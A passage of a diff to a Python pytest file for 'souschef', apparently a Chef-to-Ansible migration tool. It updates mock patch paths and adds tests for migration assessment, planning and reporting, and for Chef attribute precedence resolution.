@@ -5,11 +5,16 @@ import contextlib
 import json
 import tempfile
 from pathlib import Path
+from typing import cast
 from unittest.mock import MagicMock, patch
 
 import pytest
 
 from souschef.server import (
+    ValidationCategory,
+    ValidationEngine,
+    ValidationLevel,
+    ValidationResult,
     _convert_chef_block_to_ansible,
     _convert_chef_condition_to_ansible,
     _convert_erb_to_jinja2,
@@ -23,30 +28,38 @@ from souschef.server import (
     _extract_enhanced_notifications,
     _extract_heredoc_strings,
     _extract_inspec_describe_blocks,
+    _extract_node_attribute_path,
     _extract_resource_actions,
     _extract_resource_properties,
     _extract_resource_subscriptions,
     _extract_template_variables,
+    _format_resolved_attributes,
     _generate_inspec_from_resource,
+    _get_precedence_level,
     _normalize_path,
     _normalize_ruby_value,
     _parse_inspec_control,
+    _resolve_attribute_precedence,
     _safe_join,
     _strip_ruby_comments,
     analyze_chef_databag_usage,
+    convert_habitat_to_dockerfile,
     convert_inspec_to_test,
     convert_resource_to_task,
+    generate_compose_from_habitat,
     generate_inspec_from_recipe,
     list_cookbook_structure,
     list_directory,
     main,
     parse_attributes,
     parse_custom_resource,
+    parse_habitat_plan,
     parse_inspec_profile,
     parse_recipe,
     parse_template,
     read_cookbook_metadata,
     read_file,
+    validate_conversion,
 )
 
 
@@ -59,7 +72,9 @@ def test_list_directory_success():
     mock_file2.name = "file2.txt"
     mock_path.iterdir.return_value = [mock_file1, mock_file2]
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = list_directory(".")
         assert result == ["file1.txt", "file2.txt"]
 
@@ -87,7 +102,7 @@ end
     mock_recipes_dir.glob.return_value = [mock_recipe_file]
     mock_cookbook_path.__truediv__.return_value = mock_recipes_dir
 
-    with patch("souschef.server._normalize_path") as mock_path_class:
+    with patch("souschef.assessment._normalize_path") as mock_path_class:
         mock_path_class.return_value = mock_cookbook_path
         result = assess_chef_migration_complexity("/path/to/cookbook")
 
@@ -104,7 +119,7 @@ def test_assess_chef_migration_complexity_cookbook_not_found():
     mock_cookbook_path = MagicMock(spec=Path)
     mock_cookbook_path.exists.return_value = False
 
-    with patch("souschef.server._normalize_path") as mock_path_class:
+    with patch("souschef.assessment._normalize_path") as mock_path_class:
         mock_path_class.return_value = mock_cookbook_path
         result = assess_chef_migration_complexity("/nonexistent/path")
 
@@ -129,7 +144,7 @@ def test_generate_migration_plan_success():
     mock_recipes_dir.glob.return_value = [mock_recipe_file]
     mock_cookbook_path.__truediv__.return_value = mock_recipes_dir
 
-    with patch("souschef.server._normalize_path") as mock_path_class:
+    with patch("souschef.assessment._normalize_path") as mock_path_class:
         mock_path_class.return_value = mock_cookbook_path
         result = generate_migration_plan("/path/to/cookbook", "phased", 12)
 
@@ -163,7 +178,267 @@ depends 'build-essential'
 
         assert "Cookbook Dependency Analysis" in result
         assert "Dependency Overview" in result
-        assert "Migration Order Recommendations" in result
+
+
+def test_assess_chef_migration_complexity_multiple_cookbooks():
+    """Test migration assessment with multiple cookbooks."""
+    from souschef.server import assess_chef_migration_complexity
+
+    mock_cookbook1 = MagicMock(spec=Path)
+    mock_cookbook1.exists.return_value = True
+    mock_cookbook1.name = "cookbook1"
+
+    mock_cookbook2 = MagicMock(spec=Path)
+    mock_cookbook2.exists.return_value = True
+    mock_cookbook2.name = "cookbook2"
+
+    mock_recipes_dir = MagicMock(spec=Path)
+    mock_recipes_dir.exists.return_value = True
+    mock_recipe_file = MagicMock(spec=Path)
+    mock_recipe_file.open.return_value.__enter__.return_value.read.return_value = (
+        "package 'nginx'"
+    )
+    mock_recipes_dir.glob.return_value = [mock_recipe_file]
+
+    call_count = [0]
+
+    def mock_normalize(path):
+        call_count[0] += 1
+        return mock_cookbook1 if call_count[0] == 1 else mock_cookbook2
+
+    with (
+        patch("souschef.assessment._normalize_path", side_effect=mock_normalize),
+        patch("souschef.assessment._safe_join", return_value=mock_recipes_dir),
+    ):
+        result = assess_chef_migration_complexity("/path/1,/path/2")
+
+        assert "Total Cookbooks: 2" in result
+        assert "Migration Assessment" in result
+
+
+def test_assess_chef_migration_complexity_high_complexity_cookbook():
+    """Test migration assessment with high complexity cookbook."""
+    from souschef.server import assess_chef_migration_complexity
+
+    mock_cookbook = MagicMock(spec=Path)
+    mock_cookbook.exists.return_value = True
+    mock_cookbook.name = "complex_cookbook"
+
+    mock_recipes_dir = MagicMock(spec=Path)
+    mock_recipes_dir.exists.return_value = True
+
+    # Create 10 complex recipe files
+    recipe_files = []
+    for _i in range(10):
+        mock_recipe = MagicMock(spec=Path)
+        # High complexity: many resources, ruby blocks, custom resources
+        mock_recipe.open.return_value.__enter__.return_value.read.return_value = """
+ruby_block 'complex_operation' do
+  block do
+    # Complex Ruby logic
+  end
+end
+
+execute 'custom_command' do
+  command 'bash script.sh'
+end
+
+custom_resource 'my_resource' do
+  property :name, String
+  provides :my_resource
+end
+
+package 'nginx' do
+  action :install
+end
+
+service 'nginx' do
+  action [:enable, :start]
+end
+"""
+        recipe_files.append(mock_recipe)
+
+    mock_recipes_dir.glob.return_value = recipe_files
+    mock_templates_dir = MagicMock(spec=Path)
+    mock_templates_dir.exists.return_value = True
+    mock_templates_dir.glob.return_value = [MagicMock()] * 20
+
+    mock_files_dir = MagicMock(spec=Path)
+    mock_files_dir.exists.return_value = True
+    mock_files_dir.glob.return_value = [MagicMock()] * 15
+
+    def mock_safe_join(base, subdir):
+        return {
+            "recipes": mock_recipes_dir,
+            "templates": mock_templates_dir,
+            "files": mock_files_dir,
+        }.get(subdir, MagicMock())
+
+    with (
+        patch("souschef.assessment._normalize_path", return_value=mock_cookbook),
+        patch("souschef.assessment._safe_join", side_effect=mock_safe_join),
+    ):
+        result = assess_chef_migration_complexity("/path/to/complex")
+
+        assert "Migration Assessment" in result
+        assert "Complexity" in result or "complexity" in result
+
+
+def test_assess_chef_migration_complexity_low_complexity_cookbook():
+    """Test migration assessment with low complexity cookbook."""
+    from souschef.server import assess_chef_migration_complexity
+
+    mock_cookbook = MagicMock(spec=Path)
+    mock_cookbook.exists.return_value = True
+    mock_cookbook.name = "simple_cookbook"
+
+    mock_recipes_dir = MagicMock(spec=Path)
+    mock_recipes_dir.exists.return_value = True
+
+    # Simple recipe with minimal resources
+    mock_recipe = MagicMock(spec=Path)
+    mock_recipe.open.return_value.__enter__.return_value.read.return_value = (
+        "package 'nginx' do\n  action :install\nend"
+    )
+
+    mock_recipes_dir.glob.return_value = [mock_recipe]
+    mock_templates_dir = MagicMock(spec=Path)
+    mock_templates_dir.exists.return_value = False
+    mock_files_dir = MagicMock(spec=Path)
+    mock_files_dir.exists.return_value = False
+
+    def mock_safe_join(base, subdir):
+        return {
+            "recipes": mock_recipes_dir,
+            "templates": mock_templates_dir,
+            "files": mock_files_dir,
+        }.get(subdir, MagicMock())
+
+    with (
+        patch("souschef.assessment._normalize_path", return_value=mock_cookbook),
+        patch("souschef.assessment._safe_join", side_effect=mock_safe_join),
+    ):
+        result = assess_chef_migration_complexity("/path/to/simple")
+
+        assert "Migration Assessment" in result
+        assert "Total Cookbooks: 1" in result
+
+
+def test_generate_migration_plan_big_bang_strategy():
+    """Test migration plan with big_bang strategy."""
+    from souschef.server import generate_migration_plan
+
+    mock_cookbook = MagicMock(spec=Path)
+    mock_cookbook.exists.return_value = True
+    mock_cookbook.name = "test_cookbook"
+
+    mock_recipes_dir = MagicMock(spec=Path)
+    mock_recipes_dir.exists.return_value = True
+    mock_recipe = MagicMock(spec=Path)
+    mock_recipe.open.return_value.__enter__.return_value.read.return_value = (
+        "package 'nginx'"
+    )
+    mock_recipes_dir.glob.return_value = [mock_recipe]
+
+    with (
+        patch("souschef.assessment._normalize_path", return_value=mock_cookbook),
+        patch("souschef.assessment._safe_join", return_value=mock_recipes_dir),
+    ):
+        result = generate_migration_plan("/path/to/cookbook", "big_bang", 4)
+
+        assert "Migration Plan" in result
+        assert "Strategy: big_bang" in result or "big_bang" in result
+        assert "Timeline: 4 weeks" in result
+
+
+def test_generate_migration_plan_parallel_strategy():
+    """Test migration plan with parallel strategy."""
+    from souschef.server import generate_migration_plan
+
+    mock_cookbook = MagicMock(spec=Path)
+    mock_cookbook.exists.return_value = True
+    mock_cookbook.name = "test_cookbook"
+
+    mock_recipes_dir = MagicMock(spec=Path)
+    mock_recipes_dir.exists.return_value = True
+    mock_recipe = MagicMock(spec=Path)
+    mock_recipe.open.return_value.__enter__.return_value.read.return_value = (
+        "package 'nginx'"
+    )
+    mock_recipes_dir.glob.return_value = [mock_recipe]
+
+    with (
+        patch("souschef.assessment._normalize_path", return_value=mock_cookbook),
+        patch("souschef.assessment._safe_join", return_value=mock_recipes_dir),
+    ):
+        result = generate_migration_plan("/path/to/cookbook", "parallel", 8)
+
+        assert "Migration Plan" in result
+        assert "Strategy: parallel" in result or "parallel" in result
+        assert "Timeline: 8 weeks" in result
+
+
+def test_generate_migration_report_success():
+    """Test migration report generation with assessment results."""
+    from souschef.server import generate_migration_report
+
+    mock_cookbook = MagicMock(spec=Path)
+    mock_cookbook.exists.return_value = True
+    mock_cookbook.name = "test_cookbook"
+
+    mock_recipes_dir = MagicMock(spec=Path)
+    mock_recipes_dir.exists.return_value = True
+    mock_recipe = MagicMock(spec=Path)
+    mock_recipe.open.return_value.__enter__.return_value.read.return_value = (
+        "package 'nginx'"
+    )
+    mock_recipes_dir.glob.return_value = [mock_recipe]
+
+    with (
+        patch("souschef.assessment._normalize_path", return_value=mock_cookbook),
+        patch("souschef.assessment._safe_join", return_value=mock_recipes_dir),
+    ):
+        result = generate_migration_report(
+            "/path/to/cookbook",
+            "high_level",
+            "html",
+        )
+
+        assert "Migration Report" in result
+        # Report is generated but format isn't explicitly mentioned
+        assert "Report Type:" in result or "high_level" in result.lower()
+
+
+def test_generate_migration_report_detailed_format():
+    """Test migration report with detailed format."""
+    from souschef.server import generate_migration_report
+
+    mock_cookbook = MagicMock(spec=Path)
+    mock_cookbook.exists.return_value = True
+    mock_cookbook.name = "test_cookbook"
+
+    mock_recipes_dir = MagicMock(spec=Path)
+    mock_recipes_dir.exists.return_value = True
+    mock_recipe = MagicMock(spec=Path)
+    mock_recipe.open.return_value.__enter__.return_value.read.return_value = (
+        "package 'nginx'"
+    )
+    mock_recipes_dir.glob.return_value = [mock_recipe]
+
+    with (
+        patch("souschef.assessment._normalize_path", return_value=mock_cookbook),
+        patch("souschef.assessment._safe_join", return_value=mock_recipes_dir),
+    ):
+        result = generate_migration_report(
+            "/path/to/cookbook",
+            "detailed",
+            "markdown",
+        )
+
+        assert "Migration Report" in result
+        assert "Report Type:" in result or "Detailed" in result
+        # Detailed reports include technical sections
+        assert "Risk Assessment" in result or "Recommendations" in result
 
 
 def test_analyze_cookbook_dependencies_not_found():
@@ -173,15 +448,15 @@ def test_analyze_cookbook_dependencies_not_found():
     mock_cookbook_path = MagicMock(spec=Path)
     mock_cookbook_path.exists.return_value = False
 
-    with patch("souschef.server._normalize_path") as mock_path_class:
+    with patch("souschef.assessment._normalize_path") as mock_path_class:
         mock_path_class.return_value = mock_cookbook_path
         result = analyze_cookbook_dependencies("/nonexistent/path")
 
         assert "Error: Cookbook path not found" in result
 
 
-def test_generate_migration_report_success():
-    """Test generate_migration_report with valid assessment results."""
+def test_generate_migration_report_executive_summary():
+    """Test generate_migration_report with executive summary format."""
     from souschef.server import generate_migration_report
 
     assessment_data = '{"total_cookbooks": 3, "complexity_score": 45}'
@@ -195,43 +470,30 @@ def test_generate_migration_report_success():
 
 
 def test_convert_chef_deployment_to_ansible_strategy_success():
-    """Test convert_chef_deployment_to_ansible_strategy with valid recipe."""
+    """Test convert_chef_deployment_to_ansible_strategy with valid cookbook."""
     from souschef.server import convert_chef_deployment_to_ansible_strategy
 
-    # Create a temporary deployment recipe
-    with tempfile.NamedTemporaryFile(mode="w", suffix=".rb", delete=False) as f:
-        f.write("""
-current_env = node["app"]["current_env"] || "blue"
-target_env = current_env == "blue" ? "green" : "blue"
+    # Use fixture cookbook path which has proper structure
+    fixtures_dir = Path(__file__).parent / "fixtures"
+    cookbook_path = str(fixtures_dir / "sample_cookbook")
 
-service "nginx" do
-  action :start
-end
-""")
-        recipe_path = f.name
-
-    try:
-        result = convert_chef_deployment_to_ansible_strategy(recipe_path)
-        assert "blue_green" in result and "Strategy" in result
-        assert "Detected Pattern" in result
-        assert "Ansible" in result
-    finally:
-        Path(recipe_path).unlink(missing_ok=True)
+    result = convert_chef_deployment_to_ansible_strategy(cookbook_path)
+    assert "Strategy" in result
+    assert "Detected Pattern" in result or "detected_pattern" in result.lower()
+    assert "Ansible" in result
 
 
 def test_generate_blue_green_deployment_playbook_success():
     """Test generate_blue_green_deployment_playbook with valid parameters."""
     from souschef.server import generate_blue_green_deployment_playbook
 
-    result = generate_blue_green_deployment_playbook(
-        "webapp", '{"port": 8080}', "/health"
-    )
+    result = generate_blue_green_deployment_playbook("webapp", "/health")
 
     assert "Blue/Green Deployment Playbook" in result
     assert "Application: webapp" in result
-    assert "Main Deployment Playbook" in result
-    assert "Health Check Playbook" in result
-    assert "Rollback Playbook" in result
+    assert "Main Playbook" in result
+    assert "Health Check" in result
+    assert "Rollback" in result
 
 
 def test_generate_canary_deployment_strategy_success():
@@ -244,7 +506,7 @@ def test_generate_canary_deployment_strategy_success():
     assert "Application: webapp" in result
     assert "Initial Canary: 10%" in result
     assert "Canary Deployment Playbook" in result
-    assert "Monitoring and Validation" in result
+    assert "Monitoring" in result  # Updated to match new output
 
 
 def test_analyze_chef_application_patterns_success():
@@ -266,9 +528,9 @@ package "nginx"
 """)
 
         result = analyze_chef_application_patterns(str(cookbook_path))
-        assert "Chef Application Cookbook Analysis" in result
+        assert "Chef Application Patterns Analysis" in result
         assert "Cookbook: webapp" in result
-        assert "Deployment Patterns Detected" in result
+        assert "Detected Patterns" in result
 
 
 def test_list_directory_empty():
@@ -276,7 +538,9 @@ def test_list_directory_empty():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.return_value = []
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = list_directory("/empty")
         assert result == []
 
@@ -286,7 +550,9 @@ def test_list_directory_not_found():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.side_effect = FileNotFoundError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = list_directory("non_existent_directory")
         assert "Error: Directory not found" in result
 
@@ -296,7 +562,9 @@ def test_list_directory_not_a_directory():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.side_effect = NotADirectoryError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = list_directory("file.txt")
         assert "Error:" in result
         assert "is not a directory" in result
@@ -307,7 +575,9 @@ def test_list_directory_permission_denied():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.side_effect = PermissionError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = list_directory("/root")
         assert "Error: Permission denied" in result
 
@@ -317,7 +587,9 @@ def test_list_directory_other_exception():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.side_effect = Exception("A test exception")
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = list_directory(".")
         assert "An error occurred: A test exception" in result
 
@@ -327,7 +599,9 @@ def test_read_file_success():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.return_value = "file contents here"
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = read_file("test.txt")
         assert result == "file contents here"
         mock_path.read_text.assert_called_once_with(encoding="utf-8")
@@ -338,7 +612,9 @@ def test_read_file_not_found():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = FileNotFoundError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = read_file("missing.txt")
         assert "Error: File not found" in result
 
@@ -348,7 +624,9 @@ def test_read_file_is_directory():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = IsADirectoryError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = read_file("somedir")
         assert "Error:" in result
         assert "is a directory" in result
@@ -359,7 +637,9 @@ def test_read_file_permission_denied():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = PermissionError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = read_file("protected.txt")
         assert "Error: Permission denied" in result
 
@@ -369,7 +649,9 @@ def test_read_file_unicode_decode_error():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = UnicodeDecodeError("utf-8", b"", 0, 1, "invalid")
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = read_file("binary.dat")
         assert "Error:" in result and "codec can't decode" in result
 
@@ -379,7 +661,9 @@ def test_read_file_other_exception():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = Exception("Unexpected error")
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch(
+        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    ):
         result = read_file("test.txt")
         assert "An error occurred: Unexpected error" in result
 
@@ -397,7 +681,7 @@ depends 'iptables'
 supports 'ubuntu'
 supports 'debian'
     """
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = metadata_content
@@ -416,7 +700,7 @@ supports 'debian'
 def test_read_cookbook_metadata_minimal():
     """Test read_cookbook_metadata with minimal metadata."""
     metadata_content = "name 'simple'"
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = metadata_content
@@ -429,7 +713,7 @@ def test_read_cookbook_metadata_minimal():
 
 def test_read_cookbook_metadata_empty():
     """Test read_cookbook_metadata with empty file."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = ""
@@ -441,7 +725,7 @@ def test_read_cookbook_metadata_empty():
 
 def test_read_cookbook_metadata_not_found():
     """Test read_cookbook_metadata with non-existent file."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = FileNotFoundError()
@@ -453,7 +737,7 @@ def test_read_cookbook_metadata_not_found():
 
 def test_read_cookbook_metadata_is_directory():
     """Test read_cookbook_metadata when path is a directory."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = IsADirectoryError()
@@ -466,7 +750,7 @@ def test_read_cookbook_metadata_is_directory():
 
 def test_read_cookbook_metadata_permission_denied():
     """Test read_cookbook_metadata with permission error."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = PermissionError()
@@ -478,7 +762,7 @@ def test_read_cookbook_metadata_permission_denied():
 
 def test_read_cookbook_metadata_unicode_error():
     """Test read_cookbook_metadata with unicode decode error."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = UnicodeDecodeError(
@@ -492,7 +776,7 @@ def test_read_cookbook_metadata_unicode_error():
 
 def test_read_cookbook_metadata_other_exception():
     """Test read_cookbook_metadata with unexpected exception."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = Exception("Unexpected")
@@ -519,7 +803,7 @@ template '/etc/nginx/nginx.conf' do
   action :create
 end
     """
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = recipe_content
@@ -538,7 +822,7 @@ end
 
 def test_parse_recipe_empty():
     """Test parse_recipe with no resources."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = "# Just comments"
@@ -550,7 +834,7 @@ def test_parse_recipe_empty():
 
 def test_parse_recipe_not_found():
     """Test parse_recipe with non-existent file."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = FileNotFoundError()
@@ -562,7 +846,7 @@ def test_parse_recipe_not_found():
 
 def test_parse_recipe_is_directory():
     """Test parse_recipe when path is a directory."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = IsADirectoryError()
@@ -575,7 +859,7 @@ def test_parse_recipe_is_directory():
 
 def test_parse_recipe_permission_denied():
     """Test parse_recipe with permission error."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = PermissionError()
@@ -587,7 +871,7 @@ def test_parse_recipe_permission_denied():
 
 def test_parse_recipe_unicode_error():
     """Test parse_recipe with unicode decode error."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = UnicodeDecodeError(
@@ -601,7 +885,7 @@ def test_parse_recipe_unicode_error():
 
 def test_parse_recipe_other_exception():
     """Test parse_recipe with unexpected exception."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = Exception("Unexpected")
@@ -619,22 +903,25 @@ default['nginx']['ssl_port'] = 443
 override['nginx']['worker_processes'] = 4
 default['nginx']['user'] = 'www-data'
     """
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = attributes_content
 
         result = parse_attributes("/cookbook/attributes/default.rb")
 
-        assert "default[nginx.port] = 80" in result
-        assert "default[nginx.ssl_port] = 443" in result
-        assert "override[nginx.worker_processes] = 4" in result
-        assert "default[nginx.user] = 'www-data'" in result
+        # By default, resolved format is returned
+        assert "Resolved Attributes" in result
+        assert "nginx.port" in result
+        assert "80" in result
+        assert "443" in result
+        assert "4" in result
+        assert "www-data" in result
 
 
 def test_parse_attributes_empty():
     """Test parse_attributes with no attributes."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = "# Just comments"
@@ -646,7 +933,7 @@ def test_parse_attributes_empty():
 
 def test_parse_attributes_not_found():
     """Test parse_attributes with non-existent file."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = FileNotFoundError()
@@ -658,7 +945,7 @@ def test_parse_attributes_not_found():
 
 def test_parse_attributes_is_directory():
     """Test parse_attributes when path is a directory."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = IsADirectoryError()
@@ -671,7 +958,7 @@ def test_parse_attributes_is_directory():
 
 def test_parse_attributes_permission_denied():
     """Test parse_attributes with permission error."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = PermissionError()
@@ -683,7 +970,7 @@ def test_parse_attributes_permission_denied():
 
 def test_parse_attributes_unicode_error():
     """Test parse_attributes with unicode decode error."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = UnicodeDecodeError(
@@ -697,7 +984,7 @@ def test_parse_attributes_unicode_error():
 
 def test_parse_attributes_other_exception():
     """Test parse_attributes with unexpected exception."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.side_effect = Exception("Unexpected")
@@ -707,11 +994,171 @@ def test_parse_attributes_other_exception():
         assert "An error occurred: Unexpected" in result
 
 
+def test_parse_attributes_with_precedence_resolution(tmp_path):
+    """Test parse_attributes resolves precedence conflicts correctly."""
+    attr_file = tmp_path / "attributes.rb"
+    attr_file.write_text(
+        """
+        default['nginx']['port'] = 80
+        override['nginx']['port'] = 8080
+        normal['nginx']['port'] = 9000
+        force_override['nginx']['port'] = 443
+        """
+    )
+
+    result = parse_attributes(str(attr_file), resolve_precedence=True)
+
+    # force_override should win (highest precedence)
+    assert "443" in result
+    assert "Precedence: force_override" in result
+    assert "level 5" in result
+    assert "Overridden values:" in result
+    assert "Attributes with precedence conflicts: 1" in result
+
+
+def test_parse_attributes_without_precedence_resolution(tmp_path):
+    """Test parse_attributes shows all attributes when resolve_precedence=False."""
+    attr_file = tmp_path / "attributes.rb"
+    attr_file.write_text(
+        """
+        default['nginx']['port'] = 80
+        override['nginx']['port'] = 8080
+        """
+    )
+
+    result = parse_attributes(str(attr_file), resolve_precedence=False)
+
+    # Should show both attributes
+    assert "default[nginx.port] = 80" in result
+    assert "override[nginx.port] = 8080" in result
+
+
+def test_parse_attributes_all_precedence_levels(tmp_path):
+    """Test parse_attributes with all Chef precedence levels."""
+    attr_file = tmp_path / "attributes.rb"
+    attr_file.write_text(
+        """
+        default['app']['setting1'] = 'value1'
+        force_default['app']['setting2'] = 'value2'
+        normal['app']['setting3'] = 'value3'
+        override['app']['setting4'] = 'value4'
+        force_override['app']['setting5'] = 'value5'
+        automatic['app']['setting6'] = 'value6'
+        """
+    )
+
+    result = parse_attributes(str(attr_file))
+
+    # Check all precedence levels are recognized
+    assert "default" in result
+    assert "force_default" in result
+    assert "normal" in result
+    assert "override" in result
+    assert "force_override" in result
+    assert "automatic" in result
+    assert "Total attributes: 6" in result
+
+
+def test_get_precedence_level():
+    """Test _get_precedence_level returns correct numeric levels."""
+    assert _get_precedence_level("default") == 1
+    assert _get_precedence_level("force_default") == 2
+    assert _get_precedence_level("normal") == 3
+    assert _get_precedence_level("override") == 4
+    assert _get_precedence_level("force_override") == 5
+    assert _get_precedence_level("automatic") == 6
+    assert _get_precedence_level("unknown") == 1  # Default fallback
+
+
+def test_resolve_attribute_precedence():
+    """Test _resolve_attribute_precedence resolves conflicts correctly."""
+    attributes = [
+        {"precedence": "default", "path": "app.port", "value": "80"},
+        {"precedence": "override", "path": "app.port", "value": "8080"},
+        {"precedence": "normal", "path": "app.timeout", "value": "30"},
+    ]
+
+    resolved = _resolve_attribute_precedence(attributes)
+
+    # override should win for app.port
+    assert resolved["app.port"]["value"] == "8080"
+    assert resolved["app.port"]["precedence"] == "override"
+    assert resolved["app.port"]["has_conflict"] is True
+    assert "default=80" in str(resolved["app.port"]["overridden_values"])
+
+    # app.timeout should have no conflict
+    assert resolved["app.timeout"]["value"] == "30"
+    assert resolved["app.timeout"]["has_conflict"] is False
+    assert resolved["app.timeout"]["overridden_values"] == ""
+
+
+def test_resolve_attribute_precedence_multiple_conflicts():
+    """Test _resolve_attribute_precedence with multiple conflicting values."""
+    attributes = [
+        {"precedence": "default", "path": "db.host", "value": "localhost"},
+        {"precedence": "normal", "path": "db.host", "value": "db.local"},
+        {"precedence": "override", "path": "db.host", "value": "db.prod"},
+        {"precedence": "force_override", "path": "db.host", "value": "db.final"},
+    ]
+
+    resolved = _resolve_attribute_precedence(attributes)
+
+    # force_override should win
+    assert resolved["db.host"]["value"] == "db.final"
+    assert resolved["db.host"]["precedence"] == "force_override"
+
+    assert resolved["db.host"]["has_conflict"] is True
+
+    # Check all lower precedence values are listed
